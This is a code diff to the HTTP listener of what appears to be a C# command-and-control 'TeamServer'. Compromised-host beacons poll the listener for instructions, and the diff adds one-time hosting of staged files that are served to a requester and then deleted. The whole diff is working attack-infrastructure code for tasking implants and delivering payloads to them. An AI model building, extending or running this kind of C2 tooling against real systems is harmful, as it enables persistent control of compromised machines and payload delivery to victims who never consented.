@@ -3,6 +3,7 @@ using System.Net.Http.Json;
 using System.Text;
 using System.Text.Json;
 using System.Text.Json.Serialization;
+using static TeamServer.BeaconOperations;
 
 
 namespace TeamServer.Listeners
@@ -16,6 +17,13 @@ namespace TeamServer.Listeners
         private Task listenerTask = null;
         private bool listening = false;
 
+        public static bool httpExists = false;
+        public static List<BeaconOperations.HostedFile> hostedFiles = new List<BeaconOperations.HostedFile>();
+
+        public string Ip { get; set; }
+        public int Port { get; set; }
+
+
         private List<string> ignoreUri = new List<string>
         {
             "favicon.ico"
@@ -23,9 +31,14 @@ namespace TeamServer.Listeners
 
         public CustomHttpListener(string ip = "localhost", int port = 8081)
         {
+            this.Ip = ip;
+            this.Port = port;
+
             listener = new HttpListener();
 
             listener.Prefixes.Add("http://"+ip+":"+port.ToString()+"/");
+
+            httpExists = true;
         }
 
         public bool StartListener()
@@ -56,7 +69,28 @@ namespace TeamServer.Listeners
                             // get the beacon ID
                             string id = uriSegments.Last();
 
-                            if (!ignoreUri.Contains(id))
+                            HostedFile hostedFile = null;
+                            for (int i = 0; i < CustomHttpListener.hostedFiles.Count; i++)
+                            {
+                                if (CustomHttpListener.hostedFiles[i].fileName == id)
+                                {
+                                    hostedFile = CustomHttpListener.hostedFiles[i];
+                                }
+                            }
+
+                            if (hostedFile!=null)
+                            {
+                                resp.Headers.Set("Content-Type", "text/plain");
+
+                                buffer = hostedFile.content;
+
+                                ros = resp.OutputStream;
+                                ros.Write(buffer, 0, buffer.Length);
+                                ros.Close();
+
+                                CustomHttpListener.hostedFiles.Remove(hostedFile);
+                            }
+                            else if (!ignoreUri.Contains(id))
                             {
                                 if (req.HttpMethod == "GET") // GET - beacon gets next instructions
                                 {
@@ -92,8 +126,8 @@ namespace TeamServer.Listeners
                                     output.Write(b, 0, b.Length);
                                     context.Response.Close();
                                 }
-                                continue;
                             }
+                            continue;
                         }
 
                         data = "Listening...";
